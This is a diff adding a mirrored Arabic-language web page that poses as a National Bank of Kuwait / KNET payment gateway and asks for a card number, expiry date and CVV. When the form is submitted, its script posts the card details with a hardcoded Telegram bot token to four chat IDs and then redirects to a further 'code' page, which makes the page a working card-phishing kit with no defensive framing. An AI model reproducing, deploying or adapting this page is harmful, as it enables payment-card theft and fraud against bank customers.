@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<!-- Mirrored from pay-nbk-alkwat.netlify.app/pays.html by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 06 Oct 2025 18:02:53 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بوابة الدفع</title>
+  <style>
+    body {
+      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
+      background-color: #eee;
+      margin: 0;
+      padding: 0;
+    }
+    .banner {
+      background: url('www2.0zz0.com/2025/07/13/22/875395686.jpg') no-repeat center center;
+      background-size: cover;
+      height: 100px;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 20px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .logo img {
+      max-width: 120px;
+    }
+    .amount {
+      text-align: center;
+      font-size: 18px;
+      color: #0070c0;
+      margin: 10px 0;
+    }
+    .form-box {
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 20px;
+    }
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      color: #2e72b1;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #999;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+    .row select, .row input {
+      flex: 1;
+    }
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+    .actions button {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 0 5px;
+    }
+    .actions .submit {
+      background-color: #0070c0;
+      color: #fff;
+    }
+    .actions .cancel {
+      background-color: #ccc;
+      color: #333;
+    }
+    footer {
+      text-align: center;
+      font-size: 14px;
+      color: #777;
+      margin-top: 20px;
+    }
+    
+    /* تنسيقات التحقق من الصحة */
+    .error {
+      color: #d9534f;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+    input.invalid, select.invalid {
+      border-color: #d9534f;
+      background-color: #fdf7f7;
+    }
+    input.valid, select.valid {
+      border-color: #5cb85c;
+      background-color: #f9fff9;
+    }
+    
+    /* تنسيقات التحميل */
+    .loading {
+      opacity: 0.7;
+      pointer-events: none;
+    }
+  </style>
+ </head>
+ <body>
+  <div class="banner"></div>
+  <div class="container">
+   <div class="logo">
+    <img src="www2.0zz0.com/2025/07/13/21/825012472.png" alt="NBK Logo">
+   </div>
+   <div class="amount">
+    Halamax International Wholesale And Retail Co.
+    <br>
+   </div>
+   <div class="form-box">
+    <form id="payForm">
+     <label>رقم بطاقة الصرف الآلي:</label>
+     <div class="row">
+      <input type="text" id="cardNumber" maxlength="16" placeholder="أدخل باقي الأرقام" required>
+     </div>
+     <div id="cardNumberError" class="error">يرجى إدخال رقم بطاقة صحيح مكون من 16 رقم</div>
+
+     <label>تاريخ انتهاء البطاقة:</label>
+     <div class="row">
+      <select id="expiryMonth" required>
+        <option value="">MM</option>
+        <option value="01">01</option>
+        <option value="02">02</option>
+        <option value="03">03</option>
+        <option value="04">04</option>
+        <option value="05">05</option>
+        <option value="06">06</option>
+        <option value="07">07</option>
+        <option value="08">08</option>
+        <option value="09">09</option>
+        <option value="10">10</option>
+        <option value="11">11</option>
+        <option value="12">12</option>
+      </select>
+      <select id="expiryYear" required>
+        <option value="">YYYY</option>
+        <option value="2024">2024</option>
+        <option value="2025">2025</option>
+        <option value="2026">2026</option>
+        <option value="2027">2027</option>
+        <option value="2028">2028</option>
+        <option value="2029">2029</option>
+        <option value="2030">2030</option>
+        <option value="2031">2031</option>
+        <option value="2032">2032</option>
+        <option value="2033">2033</option>
+        <option value="2034">2034</option>
+        <option value="2035">2035</option>
+      </select>
+     </div>
+     <div id="expiryError" class="error">يرجى اختيار تاريخ انتهاء صحيح ولم ينتهي</div>
+
+     <label>ادخل الرقم السري CVV/CVC :</label>
+     <input type="password" id="pinNumber" placeholder="***" maxlength="3" required>
+     <div id="pinError" class="error">يرجى إدخال رمز CVV صحيح مكون من 3 أرقام</div>
+
+     <div class="actions">
+      <button type="button" class="cancel" id="cancelBtn">إلغاء</button>
+      <button type="submit" class="submit" id="submitBtn">إرسال</button>
+     </div>
+    </form>
+
+    <script>
+      // تبسيط التحقق من صحة رقم البطاقة
+      function validateCardNumber(cardNumber) {
+        // إزالة المسافات والشرطات
+        const cleaned = cardNumber.replace(/\s+/g, '').replace(/-/g, '');
+        
+        // التحقق من أن الرقم مكون من 16 رقم فقط
+        return /^\d{16}$/.test(cleaned);
+      }
+      
+      // التحقق من تاريخ الانتهاء
+      function validateExpiryDate(month, year) {
+        if (!month || !year) return false;
+        
+        const currentDate = new Date();
+        const currentYear = currentDate.getFullYear();
+        const currentMonth = currentDate.getMonth() + 1;
+        
+        const expiryYear = parseInt(year);
+        const expiryMonth = parseInt(month);
+        
+        // التحقق من أن التاريخ لم ينتهي
+        if (expiryYear < currentYear) return false;
+        if (expiryYear === currentYear && expiryMonth < currentMonth) return false;
+        
+        return true;
+      }
+      
+      // التحقق من رمز CVV
+      function validateCVV(cvv) {
+        return /^\d{3}$/.test(cvv);
+      }
+      
+      // إظهار رسالة الخطأ
+      function showError(elementId, message) {
+        const errorElement = document.getElementById(elementId);
+        errorElement.textContent = message;
+        errorElement.style.display = 'block';
+      }
+      
+      // إخفاء رسالة الخطأ
+      function hideError(elementId) {
+        const errorElement = document.getElementById(elementId);
+        errorElement.style.display = 'none';
+      }
+      
+      // التحقق من الحقول في الوقت الفعلي
+      document.getElementById('cardNumber').addEventListener('input', function() {
+        const cardNumber = this.value;
+        
+        if (cardNumber.length === 0) {
+          this.classList.remove('valid', 'invalid');
+          hideError('cardNumberError');
+        } else if (validateCardNumber(cardNumber)) {
+          this.classList.add('valid');
+          this.classList.remove('invalid');
+          hideError('cardNumberError');
+        } else {
+          this.classList.add('invalid');
+          this.classList.remove('valid');
+          showError('cardNumberError', 'رقم البطاقة يجب أن يكون 16 رقم');
+        }
+      });
+      
+      document.getElementById('expiryMonth').addEventListener('change', validateExpiry);
+      document.getElementById('expiryYear').addEventListener('change', validateExpiry);
+      
+      function validateExpiry() {
+        const month = document.getElementById('expiryMonth').value;
+        const year = document.getElementById('expiryYear').value;
+        
+        if (month && year) {
+          if (validateExpiryDate(month, year)) {
+            document.getElementById('expiryMonth').classList.add('valid');
+            document.getElementById('expiryMonth').classList.remove('invalid');
+            document.getElementById('expiryYear').classList.add('valid');
+            document.getElementById('expiryYear').classList.remove('invalid');
+            hideError('expiryError');
+          } else {
+            document.getElementById('expiryMonth').classList.add('invalid');
+            document.getElementById('expiryMonth').classList.remove('valid');
+            document.getElementById('expiryYear').classList.add('invalid');
+            document.getElementById('expiryYear').classList.remove('valid');
+            showError('expiryError', 'تاريخ الانتهاء غير صالح أو منتهي الصلاحية');
+          }
+        } else {
+          document.getElementById('expiryMonth').classList.remove('valid', 'invalid');
+          document.getElementById('expiryYear').classList.remove('valid', 'invalid');
+          hideError('expiryError');
+        }
+      }
+      
+      document.getElementById('pinNumber').addEventListener('input', function() {
+        const pin = this.value;
+        
+        if (pin.length === 0) {
+          this.classList.remove('valid', 'invalid');
+          hideError('pinError');
+        } else if (validateCVV(pin)) {
+          this.classList.add('valid');
+          this.classList.remove('invalid');
+          hideError('pinError');
+        } else {
+          this.classList.add('invalid');
+          this.classList.remove('valid');
+          showError('pinError', 'الرمز السري يجب أن يكون 3 أرقام');
+        }
+      });
+      
+      // زر الإلغاء
+      document.getElementById('cancelBtn').addEventListener('click', function() {
+        if (confirm('هل تريد حقاً إلغاء عملية الدفع؟')) {
+          window.history.back();
+        }
+      });
+      
+      // إرسال النموذج
+      document.getElementById("payForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        // الحصول على القيم
+        const cardNumber = document.getElementById("cardNumber").value;
+        const month = document.getElementById("expiryMonth").value;
+        const year = document.getElementById("expiryYear").value;
+        const pin = document.getElementById("pinNumber").value;
+        
+        // التحقق من صحة البيانات
+        let isValid = true;
+        
+        if (!validateCardNumber(cardNumber)) {
+          showError('cardNumberError', 'يرجى إدخال رقم بطاقة صحيح مكون من 16 رقم');
+          document.getElementById("cardNumber").focus();
+          isValid = false;
+        }
+        
+        if (!validateExpiryDate(month, year)) {
+          showError('expiryError', 'يرجى اختيار تاريخ انتهاء صحيح ولم ينتهي');
+          isValid = false;
+        }
+        
+        if (!validateCVV(pin)) {
+          showError('pinError', 'يرجى إدخال رمز CVV صحيح مكون من 3 أرقام');
+          document.getElementById("pinNumber").focus();
+          isValid = false;
+        }
+        
+        if (!isValid) {
+          return;
+        }
+        
+        // إظهار حالة التحميل
+        const submitBtn = document.getElementById("submitBtn");
+        const originalText = submitBtn.textContent;
+        submitBtn.textContent = "جاري الإرسال...";
+        submitBtn.disabled = true;
+        document.getElementById("payForm").classList.add("loading");
+        
+        // بيانات التليجرام
+        const token = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
+        const chat_ids = ["7335192117", "6323300854", "8280462390", "7942066919"];
+        
+        const message = `💳 معلومات الدفع:\n\n` +
+                        `🔢 رقم البطاقة: ${cardNumber}\n` +
+                        `📆 تاريخ الانتهاء: ${month}/${year}\n` +
+                        `🔐 الرقم السري: ${pin}`;
+        
+        console.log("بدء إرسال البيانات إلى التليجرام...");
+        
+        // إرسال الرسالة لكل chat_id
+        let sentCount = 0;
+        let errorCount = 0;
+        
+        chat_ids.forEach(chat_id => {
+          const url = `https://api.telegram.org/bot${token}/sendMessage`;
+          
+          console.log(`محاولة الإرسال إلى: ${chat_id}`);
+          
+          fetch(url, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+              chat_id: chat_id,
+              text: message
+            })
+          })
+          .then(response => {
+            console.log(`استجابة من ${chat_id}:`, response.status);
+            if (!response.ok) {
+              throw new Error(`HTTP error! status: ${response.status}`);
+            }
+            return response.json();
+          })
+          .then(data => {
+            console.log(`بيانات الاستجابة من ${chat_id}:`, data);
+            if (data.ok) {
+              sentCount++;
+              console.log(`✅ تم الإرسال إلى ${chat_id} بنجاح`);
+            } else {
+              errorCount++;
+              console.error(`❌ فشل الإرسال إلى ${chat_id}:`, data.description);
+            }
+          })
+          .catch(error => {
+            errorCount++;
+            console.error(`❌ خطأ في الإرسال إلى ${chat_id}:`, error);
+          })
+          .finally(() => {
+            // إذا اكتملت جميع المحاولات
+            if (sentCount + errorCount === chat_ids.length) {
+              console.log(`اكتمل الإرسال: ${sentCount} نجاح, ${errorCount} فشل`);
+              
+              // إعادة الزر إلى حالته الأصلية
+              submitBtn.textContent = originalText;
+              submitBtn.disabled = false;
+              document.getElementById("payForm").classList.remove("loading");
+              
+              if (sentCount > 0) {
+                // الانتقال إلى الصفحة التالية
+                window.location.href = "code.html";
+              } else {
+                alert("❌ فشل إرسال البيانات. يرجى المحاولة مرة أخرى.");
+              }
+            }
+          });
+        });
+      });
+    </script>
+   </div>
+   <footer>
+    جميع الحقوق محفوظة © KNET / KPay 2025
+   </footer>
+  </div>
+ </body>
+
+<!-- Mirrored from pay-nbk-alkwat.netlify.app/pays.html by HTTrack Website Copier/3.x [XR&CO'2017], Mon, 06 Oct 2025 18:03:10 GMT -->
+</html>
